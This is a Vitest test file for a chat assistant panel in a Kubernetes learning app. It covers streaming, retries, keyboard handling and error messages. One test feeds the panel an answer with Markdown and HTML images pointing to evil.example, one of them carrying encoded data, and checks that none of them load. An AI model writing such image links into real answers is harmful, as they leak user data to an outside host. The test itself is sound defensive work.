import { afterEach, beforeEach, describe, expect, it, vi } from "vitest";
import { act, cleanup, fireEvent, render, screen, waitFor, within } from "@testing-library/react";
import { MemoryRouter } from "react-router";
import type { AssistantMessage, AssistantStatus } from "../api";
import { choiceView, cka, kcna, linux } from "../fixtures";

const ready: AssistantStatus = { enabled: true, configured: true, provider: "ollama", model: "llama3.2", writable: true };
const server = {
  // GET /api/config → assistant; null is a server that has none.
  status: ready as AssistantStatus | null,
  stored: [] as AssistantMessage[],
  historyCalls: 0,
  cleared: 0,
};
const stored = (id: number, role: "user" | "assistant", content: string, partial = false): AssistantMessage => ({ id, role, content, at: "", partial });

vi.mock("../api", async (original) => ({
  ...(await original<typeof import("../api")>()),
  api: {
    config: async () => ({ version: "test", tutor: false, user: "", maxTerminals: 1, ...(server.status ? { assistant: server.status } : {}) }),
    assistantHistory: async () => { server.historyCalls++; return { messages: server.stored, limits: { turns: 20, messageChars: 4000 } }; },
    assistantClear: async () => { server.cleared++; server.stored = []; },
  },
}));
vi.mock("./stream", async (original) => ({
  ...(await original<typeof import("./stream")>()),
  streamAssistant: (await import("./fakeStream")).fakeStream.open,
}));

import { resetConfigCache } from "../config";
import { registerTerminal } from "../terminalBus";
import { Choice } from "../components/Choice";
import { AssistantPanel, type AssistantPanelProps } from "./AssistantPanel";
import { newAsk } from "./dock";
import { context, delta, done, failed, fakeStream, meta } from "./fakeStream";
import { AssistantError } from "./stream";
import { DEFAULT_QUESTION } from "./useAssistant";

const panel = (props: Partial<AssistantPanelProps> = {}) => (
  <MemoryRouter><AssistantPanel sid="s1" qid="q1" track={cka} {...props} /></MemoryRouter>
);
/** Renders the panel and waits until it shows what the configuration allows. */
async function show(props: Partial<AssistantPanelProps> = {}) {
  const view = render(panel(props));
  await waitFor(() => expect(screen.queryByRole("status", { name: "Loading the assistant" })).toBeNull());
  if (server.status?.enabled && server.status.configured && props.active !== false) {
    await waitFor(() => expect(screen.queryByRole("status", { name: "Loading the conversation" })).toBeNull());
  }
  return view;
}
const input = () => screen.getByRole("textbox", { name: "Ask the assistant" }) as HTMLTextAreaElement;
const type = (text: string) => fireEvent.change(input(), { target: { value: text } });
const enter = (init: KeyboardEventInit = {}) => fireEvent.keyDown(input(), { key: "Enter", ...init });
const ask = (text: string) => { type(text); enter(); };
/** Sends `text` and has the assistant answer with `events`. */
async function exchange(text: string, ...events: Parameters<typeof fakeStream.last.push>) {
  fakeStream.answer = events;
  ask(text);
  await waitFor(() => expect(screen.queryByRole("button", { name: "Stop" })).toBeNull());
  await waitFor(() => expect(screen.getByRole("button", { name: "Send" })).toBeTruthy());
  fakeStream.answer = null;
}
const log = () => screen.getByRole("log");
const announcement = () => screen.getAllByRole("status").find((el) => el.classList.contains("sr-only"))?.textContent;
const chips = () => ["Where should I start?", "What went wrong, and what should I look at next?", "Give me a hint, not the solution",
  "What should I remember from this task?", "Why is that the right answer?"].filter((c) => screen.queryByRole("button", { name: c }));

beforeEach(() => {
  Object.assign(server, { status: ready, stored: [], historyCalls: 0, cleared: 0 });
  fakeStream.reset();
  resetConfigCache();
});
afterEach(() => { cleanup(); vi.useRealTimers(); });

describe("AssistantPanel when the assistant cannot be used", () => {
  it("says that it is switched off and leads to the settings", async () => {
    server.status = { ...ready, enabled: false, configured: false };
    await show();
    expect(screen.getByRole("heading", { name: "The assistant is switched off" })).toBeTruthy();
    expect(screen.getByRole("link", { name: "Open settings" }).getAttribute("href")).toBe("/settings");
    expect(screen.queryByRole("textbox")).toBeNull();
    expect(screen.queryByRole("log")).toBeNull();
    // Nothing is asked of a server that would refuse it.
    expect(server.historyCalls).toBe(0);
  });

  it("says that it is not ready when it is switched on and something is missing", async () => {
    server.status = { ...ready, configured: false };
    await show();
    expect(screen.getByRole("heading", { name: "The assistant is not ready yet" })).toBeTruthy();
    expect(screen.getByRole("link", { name: "Open settings" })).toBeTruthy();
  });

  it("points to the administrator on a hosted server, which has no settings to open", async () => {
    server.status = { ...ready, configured: false, writable: false };
    await show();
    expect(screen.getByText("The assistant is configured by the administrator of this kubedojo.")).toBeTruthy();
    expect(screen.queryByRole("link", { name: "Open settings" })).toBeNull();
    expect(screen.queryByRole("textbox")).toBeNull();
  });

  it("offers nothing to a server without an assistant", async () => {
    server.status = null;
    await show();
    expect(screen.getByRole("heading", { name: "The assistant is not available" })).toBeTruthy();
    expect(screen.queryByRole("link", { name: "Open settings" })).toBeNull();
  });
});

describe("AssistantPanel", () => {
  it("names the model in its header, with a link to the settings, and can be closed", async () => {
    const onClose = vi.fn();
    await show({ onClose });
    expect(screen.getByRole("heading", { name: "Assistant" })).toBeTruthy();
    const chip = screen.getByRole("link", { name: "llama3.2 · Ollama" });
    expect(chip.getAttribute("href")).toBe("/settings");
    fireEvent.click(screen.getByRole("button", { name: "Close the assistant" }));
    expect(onClose).toHaveBeenCalledTimes(1);
    expect(screen.getByText("Answers come from your configured model and can be wrong. Not available during an exam.")).toBeTruthy();
  });

  it("has no close button where nothing closes it", async () => {
    await show();
    expect(screen.queryByRole("button", { name: "Close the assistant" })).toBeNull();
  });

  it("says what the conversation is about where a page has several questions", async () => {
    await show({ subject: "Repair a node" });
    expect(screen.getByText("About: Repair a node")).toBeTruthy();
  });

  it("shows the stored conversation: the learner's messages and the answers as Markdown", async () => {
    server.stored = [stored(1, "user", "Why does it fail?"), stored(2, "assistant", "The **kubelet** is stopped.\n\n```bash\nsystemctl start kubelet\n```")];
    const { container } = await show();
    expect(within(log()).getByText("Why does it fail?")).toBeTruthy();
    expect(container.querySelector(".md strong")?.textContent).toBe("kubelet");
    expect(container.querySelector(".md pre code")?.textContent).toBe("systemctl start kubelet");
    // The buttons of a code block are the ones task texts have.
    expect(within(log()).getByRole("button", { name: "Copy" })).toBeTruthy();
    expect(within(log()).queryByRole("button", { name: "Run in terminal" })).toBeNull();
  });

  it("runs a command of an answer in the terminal, where there is one", async () => {
    const typed: string[] = [];
    const unregister = registerTerminal((text) => typed.push(text));
    server.stored = [stored(1, "user", "How?"), stored(2, "assistant", "```bash\nsystemctl start kubelet\n```")];
    await show();
    fireEvent.click(within(log()).getByRole("button", { name: "Run in terminal" }));
    expect(typed).toEqual(["systemctl start kubelet\n"]);
    unregister();
  });

  it("loads no image an answer names, and shows its description in its place", async () => {
    server.stored = [stored(1, "user", "Show me"), stored(2, "assistant",
      "Look: ![the rollout diagram](https://evil.example/leak.png?d=c2VjcmV0) and ![](https://evil.example/pixel.gif)\n\n<img src=\"https://evil.example/raw.png\">\n\n[![badge](https://evil.example/b.svg)](https://example.org)")];
    const { container } = await show();
    expect(container.querySelector("img")).toBeNull();
    expect(container.innerHTML).not.toContain("evil.example/leak.png");
    expect(container.innerHTML).not.toContain("evil.example/pixel.gif");
    expect(within(log()).getByText("the rollout diagram")).toBeTruthy();
    // A link stays a link, and opens outside.
    const link = within(log()).getByRole("link", { name: "badge" });
    expect([link.getAttribute("href"), link.getAttribute("target"), link.getAttribute("rel")]).toEqual(["https://example.org", "_blank", "noopener noreferrer"]);
  });

  it("is a log that is not read out as it grows, with a status that says when an answer starts and ends", async () => {
    await show();
    expect(log().getAttribute("aria-live")).toBe("off");
    expect(announcement()).toBe("");
    ask("Why?");
    await waitFor(() => expect(announcement()).toBe("The assistant is answering"));
    await act(async () => { fakeStream.last.push(meta(), delta("Because "), delta("the kubelet is stopped.")); });
    await waitFor(() => expect(within(log()).getByText("Because the kubelet is stopped.")).toBeTruthy());
    // The text of the answer is in the log only: the status never repeats it.
    expect(announcement()).toBe("The assistant is answering");
    expect(within(log()).queryByRole("status")).toBeNull();
    await act(async () => { fakeStream.last.push(done()); });
    await waitFor(() => expect(announcement()).toBe("Answer ready"));
  });

  it("sends with Enter and makes a line break with Shift+Enter", async () => {
    await show();
    const send = () => screen.getByRole("button", { name: "Send" }) as HTMLButtonElement;
    expect(send().disabled).toBe(true);
    enter();
    expect(fakeStream.calls).toHaveLength(0);
    type("first line");
    expect(send().disabled).toBe(false);
    expect(enter({ shiftKey: true })).toBe(true); // not prevented: the line break is the browser's
    expect(fakeStream.calls).toHaveLength(0);
    // Enter while a word is being composed belongs to the input method.
    fireEvent.keyDown(input(), { key: "Enter", isComposing: true });
    expect(fakeStream.calls).toHaveLength(0);
    expect(enter()).toBe(false);
    await waitFor(() => expect(fakeStream.calls).toHaveLength(1));
    expect(fakeStream.last.request).toEqual({ message: "first line" });
    expect(input().value).toBe("");
    expect(within(log()).getByText("first line")).toBeTruthy();
  });

  it("sends with the button too", async () => {
    await show();
    type("by click");
    fireEvent.click(screen.getByRole("button", { name: "Send" }));
    await waitFor(() => expect(fakeStream.calls).toHaveLength(1));
    expect(fakeStream.last.request).toEqual({ message: "by click" });
  });

  it("takes no text while an answer arrives, and offers Stop in place of Send", async () => {
    await show();
    input().focus();
    ask("Why?");
    const stop = await screen.findByRole("button", { name: "Stop" });
    expect(screen.queryByRole("button", { name: "Send" })).toBeNull();
    expect(input().readOnly).toBe(true);
    expect(input().getAttribute("aria-disabled")).toBe("true");
    // It keeps the focus: a disabled field would hand the keyboard back to the page.
    expect(document.activeElement).toBe(input());
    await act(async () => { fakeStream.last.push(meta(), delta("Half an ans")); });
    await waitFor(() => expect(within(log()).getByText("Half an ans")).toBeTruthy());

    fireEvent.click(stop);
    expect(fakeStream.last.signal?.aborted).toBe(true);
    expect(screen.getByRole("button", { name: "Send" })).toBeTruthy();
    expect(input().readOnly).toBe(false);
    expect(within(log()).getByText("Interrupted")).toBeTruthy();
  });

  it("says what kubedojo looked at, in the words of the track", async () => {
    const stages = [meta(), context("checks"), context("snapshot"), context("diagnostics"), delta("ok"), done()];
    const view = await show();
    await exchange("x", ...stages);
    expect(screen.getByText("Looked at: task, check results, cluster snapshot, failing checks")).toBeTruthy();
    view.unmount();

    await show({ track: linux });
    await exchange("x", meta(), context("checks"), context("snapshot"), delta("ok"), done());
    expect(screen.getByText("Looked at: exercise, check results, host snapshot")).toBeTruthy();
    cleanup();

    await show({ track: kcna });
    await exchange("x", meta(), context("checks"), delta("ok"), done());
    expect(screen.getByText("Looked at: question, your answer")).toBeTruthy();
  });

  it("says what it is waiting for before the first text arrives", async () => {
    await show();
    ask("x");
    expect(await within(log()).findByText("Waiting for the model")).toBeTruthy();
    await act(async () => { fakeStream.last.push(meta(), context("checks")); });
    expect(await within(log()).findByText("Reading your results")).toBeTruthy();
    await act(async () => { fakeStream.last.push(context("snapshot")); });
    expect(await within(log()).findByText("Taking a read-only look at the sandbox")).toBeTruthy();
    await act(async () => { fakeStream.last.push(delta("Now.")); });
    await waitFor(() => expect(within(log()).queryByText("Taking a read-only look at the sandbox")).toBeNull());
  });

  it("shows how long an answer took and how long it is, and offers to copy it and to ask again for the last one", async () => {
    await show();
    await exchange("one", meta(), delta("First."), done(2));
    expect(screen.getByText("4.2 s · 164 tokens")).toBeTruthy();
    await exchange("two", meta({ userMessageId: 3 }), delta("Second."), done(4, { durationMs: 900, usage: { inputTokens: 10, outputTokens: 1 } }));
    expect(screen.getByText("0.9 s · 1 token")).toBeTruthy();
    expect(screen.getAllByRole("button", { name: "Copy answer" })).toHaveLength(2);
    expect(screen.getAllByRole("button", { name: "Ask again" })).toHaveLength(1);

    fakeStream.answer = [meta(), delta("Third."), done(5)];
    fireEvent.click(screen.getByRole("button", { name: "Ask again" }));
    await waitFor(() => expect(within(log()).getByText("Third.")).toBeTruthy());
    expect(fakeStream.last.request).toEqual({ retryOf: 4 });
    expect(within(log()).queryByText("Second.")).toBeNull();
  });

  it("leaves the tokens out where the provider did not count them, and says when the length limit cut the answer", async () => {
    await show();
    await exchange("x", meta(), delta("Long"), done(2, { finishReason: "length", usage: { inputTokens: 0, outputTokens: 0 } }));
    expect(screen.getByText("4.2 s · cut at the length limit")).toBeTruthy();
  });

  it("copies an answer as its Markdown", async () => {
    const writeText = vi.fn(async () => undefined);
    vi.stubGlobal("navigator", { ...navigator, clipboard: { writeText } });
    server.stored = [stored(1, "user", "x"), stored(2, "assistant", "Use `kubectl get pods`.")];
    await show();
    fireEvent.click(screen.getByRole("button", { name: "Copy answer" }));
    expect(writeText).toHaveBeenCalledWith("Use `kubectl get pods`.");
    vi.unstubAllGlobals();
  });

  it("marks a partial answer as interrupted and asks again for it", async () => {
    server.stored = [stored(1, "user", "Why?"), stored(2, "assistant", "Half an ans", true)];
    await show();
    expect(within(log()).getByText("Interrupted")).toBeTruthy();
    expect(screen.queryByRole("button", { name: "Ask again" })).toBeNull();
    fakeStream.answer = [meta(), delta("The whole answer."), done(3)];
    fireEvent.click(within(log()).getByRole("button", { name: "Retry" }));
    await waitFor(() => expect(within(log()).getByText("The whole answer.")).toBeTruthy());
    expect(fakeStream.last.request).toEqual({ retryOf: 2 });
    expect(within(log()).queryByText("Interrupted")).toBeNull();
  });

  it("offers to ask again for a message that has no answer", async () => {
    server.stored = [stored(1, "user", "Why?")];
    await show();
    expect(within(log()).getByText("No answer yet.")).toBeTruthy();
    fakeStream.answer = [meta(), delta("Because."), done(2)];
    fireEvent.click(within(log()).getByRole("button", { name: "Retry" }));
    await waitFor(() => expect(within(log()).getByText("Because.")).toBeTruthy());
    expect(fakeStream.last.request).toEqual({ message: "Why?" });
    expect(within(log()).getAllByText("Why?")).toHaveLength(1);
  });

  it.each([
    ["none", ["Where should I start?"]],
    ["failed", ["What went wrong, and what should I look at next?", "Give me a hint, not the solution"]],
    ["passed", ["What should I remember from this task?"]],
    ["reviewed", ["Why is that the right answer?"]],
  ] as const)("suggests what to ask when the question is %s", async (situation, want) => {
    await show({ situation });
    expect(chips()).toEqual(want);
  });

  it("sends a suggestion on a click and does not suggest again what was asked", async () => {
    await show({ situation: "failed" });
    fakeStream.answer = [meta(), delta("Look at the events."), done()];
    fireEvent.click(screen.getByRole("button", { name: "Give me a hint, not the solution" }));
    await waitFor(() => expect(within(log()).getByText("Look at the events.")).toBeTruthy());
    expect(fakeStream.last.request).toEqual({ message: "Give me a hint, not the solution" });
    expect(chips()).toEqual(["What went wrong, and what should I look at next?"]);
  });

  it("suggests nothing while an answer arrives", async () => {
    await show({ situation: "failed" });
    ask("x");
    await screen.findByRole("button", { name: "Stop" });
    expect(chips()).toEqual([]);
  });

  it("counts the characters near the limit and does not send a message over it", async () => {
    await show();
    type("a".repeat(3599));
    expect(screen.queryByText(/\/ 4000$/)).toBeNull();
    type("a".repeat(3600));
    expect(screen.getByText("3600 / 4000")).toBeTruthy();
    // Characters as the server counts them: an emoji is one, not two.
    type("😀".repeat(4000));
    expect(screen.getByText("4000 / 4000")).toBeTruthy();
    expect((screen.getByRole("button", { name: "Send" }) as HTMLButtonElement).disabled).toBe(false);
    type("a".repeat(4001));
    expect(screen.getByText("4001 / 4000")).toBeTruthy();
    expect(input().getAttribute("aria-invalid")).toBe("true");
    expect((screen.getByRole("button", { name: "Send" }) as HTMLButtonElement).disabled).toBe(true);
    enter();
    expect(fakeStream.calls).toHaveLength(0);
    expect(input().value).toHaveLength(4001);
  });

  it("starts a new conversation after asking", async () => {
    await show();
    expect(screen.queryByRole("button", { name: "New conversation" })).toBeNull();
    await exchange("Why?", meta(), delta("Because."), done());
    fireEvent.click(screen.getByRole("button", { name: "New conversation" }));
    const confirm = screen.getByRole("alertdialog", { name: "Start a new conversation?" });
    expect(document.activeElement).toBe(within(confirm).getByRole("button", { name: "Cancel" }));
    fireEvent.click(within(confirm).getByRole("button", { name: "Cancel" }));
    expect(screen.queryByRole("alertdialog")).toBeNull();
    expect(server.cleared).toBe(0);
    expect(within(log()).getByText("Because.")).toBeTruthy();

    fireEvent.click(screen.getByRole("button", { name: "New conversation" }));
    fireEvent.click(within(screen.getByRole("alertdialog")).getByRole("button", { name: "Delete" }));
    await waitFor(() => expect(server.cleared).toBe(1));
    expect(within(log()).queryByText("Because.")).toBeNull();
    expect(screen.queryByRole("button", { name: "New conversation" })).toBeNull();
    expect(screen.getByText("Stuck, or curious why something works?")).toBeTruthy();
  });

  it("sends what a button of the page asks for, once", async () => {
    const first = newAsk();
    const view = await show({ ask: first });
    await waitFor(() => expect(fakeStream.calls).toHaveLength(1));
    expect(fakeStream.last.request).toEqual({ message: "" });
    expect(within(log()).getByText(DEFAULT_QUESTION)).toBeTruthy();
    await act(async () => { fakeStream.last.push(meta(), delta("Because."), done()); });
    await waitFor(() => expect(screen.getByRole("button", { name: "Send" })).toBeTruthy());

    // The same request again is no new one, not for this panel and not for one mounted in its place.
    view.rerender(panel({ ask: first, situation: "failed" }));
    view.unmount();
    await show({ ask: first });
    await act(async () => { await new Promise((r) => setTimeout(r, 10)); });
    expect(fakeStream.calls).toHaveLength(1);

    cleanup();
    const view2 = await show();
    view2.rerender(panel({ ask: newAsk("Why is that the right answer?") }));
    await waitFor(() => expect(fakeStream.calls).toHaveLength(2));
    expect(fakeStream.last.request).toEqual({ message: "Why is that the right answer?" });
  });

  it("drops a request of the page when the assistant cannot answer", async () => {
    server.status = { ...ready, configured: false };
    await show({ ask: newAsk() });
    await act(async () => { await new Promise((r) => setTimeout(r, 10)); });
    expect(fakeStream.calls).toHaveLength(0);
  });

  it("loads nothing while it is out of view, and takes the keyboard when it is opened", async () => {
    const view = await show({ active: false });
    expect(server.historyCalls).toBe(0);
    expect(document.activeElement).not.toBe(input());
    view.rerender(panel({ active: true }));
    await waitFor(() => expect(server.historyCalls).toBe(1));
    expect(document.activeElement).toBe(input());
  });

  it("follows the answer down until the learner scrolls up", async () => {
    await show();
    const el = log();
    let height = 400;
    Object.defineProperty(el, "scrollHeight", { get: () => height, configurable: true });
    Object.defineProperty(el, "clientHeight", { get: () => 300, configurable: true });
    ask("x");
    await screen.findByRole("button", { name: "Stop" });
    height = 900;
    await act(async () => { fakeStream.last.push(meta(), delta("A long answer")); });
    await waitFor(() => expect(el.scrollTop).toBe(900));

    // The learner scrolls up to read: the list stays where it is.
    el.scrollTop = 120;
    fireEvent.scroll(el);
    height = 1500;
    await act(async () => { fakeStream.last.push(delta(" that goes on"), done()); });
    await waitFor(() => expect(within(el).getByText("A long answer that goes on")).toBeTruthy());
    expect(el.scrollTop).toBe(120);

    // Back at the end, and with the next message, it follows again.
    fakeStream.answer = [meta(), delta("More."), done(4)];
    height = 2000;
    ask("y");
    await waitFor(() => expect(within(el).getByText("More.")).toBeTruthy());
    expect(el.scrollTop).toBe(2000);
  });
});

describe("AssistantPanel and the keyboard of the page", () => {
  it("keeps what is typed into its input from the number keys and Enter of a quiz", async () => {
    const onChange = vi.fn(), onSubmit = vi.fn();
    render(
      <MemoryRouter>
        <Choice choice={choiceView()} value={["a"]} onChange={onChange} onSubmit={onSubmit} />
        <AssistantPanel sid="s1" qid="placing-pods" track={kcna} />
      </MemoryRouter>,
    );
    await waitFor(() => expect(screen.getByRole("textbox", { name: "Ask the assistant" })).toBeTruthy());
    input().focus();
    for (const key of ["1", "2", "3", "4"]) fireEvent.keyDown(input(), { key });
    enter();
    expect(onChange).not.toHaveBeenCalled();
    expect(onSubmit).not.toHaveBeenCalled();
    // The same keys on the page itself do reach the quiz.
    fireEvent.keyDown(document.body, { key: "2" });
    expect(onChange).toHaveBeenCalledWith(["b"]);
    fireEvent.keyDown(document.body, { key: "Enter" });
    expect(onSubmit).toHaveBeenCalledTimes(1);
  });

  it("keeps Escape to itself while there is a draft or an answer on its way, so that nothing around it closes", async () => {
    const onKeyDown = vi.fn();
    render(<div onKeyDown={onKeyDown}>{panel()}</div>);
    await waitFor(() => expect(screen.getByRole("textbox", { name: "Ask the assistant" })).toBeTruthy());
    // Nothing to lose: Escape passes, and what the panel sits in may close.
    expect(fireEvent.keyDown(input(), { key: "Escape" })).toBe(true);
    expect(onKeyDown).toHaveBeenCalledTimes(1);

    type("a draft");
    expect(fireEvent.keyDown(input(), { key: "Escape" })).toBe(false);
    expect(onKeyDown).toHaveBeenCalledTimes(1);
    expect(input().value).toBe("a draft");

    enter();
    await screen.findByRole("button", { name: "Stop" });
    expect(fireEvent.keyDown(input(), { key: "Escape" })).toBe(false);
    expect(onKeyDown).toHaveBeenCalledTimes(2); // the Enter that sent the message
    expect(fakeStream.last.signal?.aborted).toBe(false);
  });
});

describe("AssistantPanel when there is no answer", () => {
  /** Asks, lets the stream fail with `code` and returns the note that says so. */
  async function failWith(code: string, message = "", props: Partial<AssistantPanelProps> = {}) {
    await show(props);
    fakeStream.answer = [meta(), failed(code, message)];
    ask("Why?");
    return await screen.findByRole("alert");
  }
  const actions = (note: HTMLElement) => [
    ...within(note).queryAllByRole("button").map((b) => b.textContent),
    ...within(note).queryAllByRole("link").map((a) => `${a.textContent} -> ${a.getAttribute("href")}`),
  ];

  it.each([
    ["unreachable", "Could not reach http://localhost:11434. Is Ollama running?", "Could not reach http://localhost:11434. Is Ollama running?", ["Retry", "Open settings -> /settings"]],
    ["unreachable", "", "The model could not be reached. Is it running, and is the base URL right?", ["Retry", "Open settings -> /settings"]],
    ["auth", "The provider rejected the key.", "The provider rejected the API key. Check the key in the settings.", ["Open settings -> /settings"]],
    ["model_not_found", "model not found", "The provider does not know the model llama3.2. Check its name in the settings.", ["Open settings -> /settings"]],
    ["rate_limited", "", "Too many requests at once. Wait a moment and try again.", ["Retry"]],
    ["timeout", "no answer in time", "The model did not answer in time. A local model may still be loading: try again.", ["Retry"]],
    ["refused", "refused", "The model declined to answer this.", []],
    ["busy", "", "The previous answer for this question is still being written. Try again in a moment.", ["Retry"]],
    ["exam_running", "", "The assistant is not available during an exam. It is there again on the report.", []],
    ["blocked_url", "The base URL is not allowed: link-local address.", "The base URL is not allowed: link-local address.", ["Open settings -> /settings"]],
    ["bad_request", "400", "The provider did not accept the request. Check the model name in the settings.", ["Open settings -> /settings"]],
    ["upstream", "502 from upstream", "The provider failed to answer. Try again.", ["Retry"]],
    ["network", "", "kubedojo could not be reached. Check that it is still running.", ["Retry"]],
    ["something_new", "", "The assistant could not answer.", ["Retry"]],
  ])("explains %s (%s) and offers what helps", async (code, message, text, want) => {
    const note = await failWith(code, message);
    expect(within(note).getByText(text)).toBeTruthy();
    expect(actions(note)).toEqual(want);
    // The message of the learner stays, so that it can be sent again.
    expect(within(log()).getByText("Why?")).toBeTruthy();
  });

  it("never shows what is not a sentence: no JSON and no HTML of a server in between", async () => {
    const note = await failWith("something_new", '{"error":{"type":"overloaded_error","message":"Overloaded"}}');
    expect(note.textContent).toContain("The assistant could not answer.");
    expect(note.textContent).not.toContain("overloaded_error");
    cleanup();
    const html = await failWith("unreachable", "<html><body><h1>502 Bad Gateway</h1></body></html>");
    expect(html.textContent).toContain("The model could not be reached.");
    expect(html.textContent).not.toContain("502");
  });

  it("asks again from the note", async () => {
    const note = await failWith("upstream");
    fakeStream.answer = [meta(), delta("Now it works."), done()];
    fireEvent.click(within(note).getByRole("button", { name: "Retry" }));
    await waitFor(() => expect(within(log()).getByText("Now it works.")).toBeTruthy());
    expect(fakeStream.last.request).toEqual({ message: "Why?" });
    expect(screen.queryByRole("alert")).toBeNull();
  });

  it("shows the trace of a failed answer, small and selectable, when the server names one", async () => {
    await show();
    fakeStream.answer = [meta({ traceId: "4bf92f3577b34da6a3ce929d0e0e4736" }), failed("upstream")];
    ask("Why?");
    const trace = await screen.findByText("Trace 4bf92f3577b34da6a3ce929d0e0e4736");
    expect(trace.className).toContain("select-all");
    expect(trace.className).toContain("text-xs");
    cleanup();
    const note = await failWith("upstream");
    expect(within(note).queryByText(/^Trace/)).toBeNull();
  });

  it("waits as long as a refusal asks for before it offers to try again", async () => {
    vi.useFakeTimers({ shouldAdvanceTime: true });
    await show();
    ask("Why?");
    await waitFor(() => expect(fakeStream.calls).toHaveLength(1));
    await act(async () => { fakeStream.last.fail(new AssistantError("rate_limited", "The assistant is busy with other answers. Try again in a few seconds.", 429, 7)); });
    const note = await screen.findByRole("alert");
    // The sentence is the server's; the button counts the seconds of Retry-After down.
    expect(within(note).getByText("The assistant is busy with other answers. Try again in a few seconds.")).toBeTruthy();
    const retry = within(note).getByRole("button", { name: /^Retry/ }) as HTMLButtonElement;
    expect([retry.textContent, retry.disabled]).toEqual(["Retry in 7 s", true]);
    act(() => { vi.advanceTimersByTime(6000); });
    expect([retry.textContent, retry.disabled]).toEqual(["Retry in 1 s", true]);
    act(() => { vi.advanceTimersByTime(1100); });
    expect([retry.textContent, retry.disabled]).toEqual(["Retry", false]);
  });

  it("names the limit for a message the server found too long", async () => {
    await show();
    ask("Why?");
    await waitFor(() => expect(fakeStream.calls).toHaveLength(1));
    await act(async () => { fakeStream.last.fail(new AssistantError("too_long", "The message has more than 4000 characters.", 400)); });
    const note = await screen.findByRole("alert");
    expect(within(note).getByText("The message is too long. A message has at most 4000 characters.")).toBeTruthy();
    expect(actions(note)).toEqual([]);
  });

  it("sends nobody to settings that cannot be changed", async () => {
    server.status = { ...ready, writable: false };
    const note = await failWith("auth");
    expect(within(note).getByText("The provider rejected the API key. Check the key in the settings.")).toBeTruthy();
    expect(within(note).getByText("The assistant is configured by the administrator of this kubedojo.")).toBeTruthy();
    expect(actions(note)).toEqual([]);
  });

  it("asks the server what is the case when it says the assistant is not set up", async () => {
    await show();
    ask("Why?");
    await waitFor(() => expect(fakeStream.calls).toHaveLength(1));
    // Somebody switched it off in the meantime.
    server.status = { ...ready, enabled: false, configured: false };
    await act(async () => { fakeStream.last.fail(new AssistantError("not_configured", "The assistant is not available. The assistant is switched off.", 409)); });
    expect(await screen.findByRole("heading", { name: "The assistant is switched off" })).toBeTruthy();
    expect(screen.queryByRole("textbox")).toBeNull();
  });

  it("offers to load a conversation again that could not be loaded", async () => {
    await show();
    await exchange("x", meta(), delta("First."), done(2));
    fakeStream.answer = null;
    fireEvent.click(screen.getByRole("button", { name: "Ask again" }));
    await waitFor(() => expect(fakeStream.calls).toHaveLength(2));
    server.stored = [stored(1, "user", "x"), stored(9, "assistant", "From another tab.")];
    await act(async () => { fakeStream.last.fail(new AssistantError("bad_retry", "Only the assistant's last answer can be asked for again.", 400)); });
    const note = await screen.findByRole("alert");
    expect(within(note).getByText("This conversation has changed elsewhere. Load it again.")).toBeTruthy();
    fireEvent.click(within(note).getByRole("button", { name: "Load again" }));
    await waitFor(() => expect(within(log()).getByText("From another tab.")).toBeTruthy());
    expect(screen.queryByRole("alert")).toBeNull();
  });
});
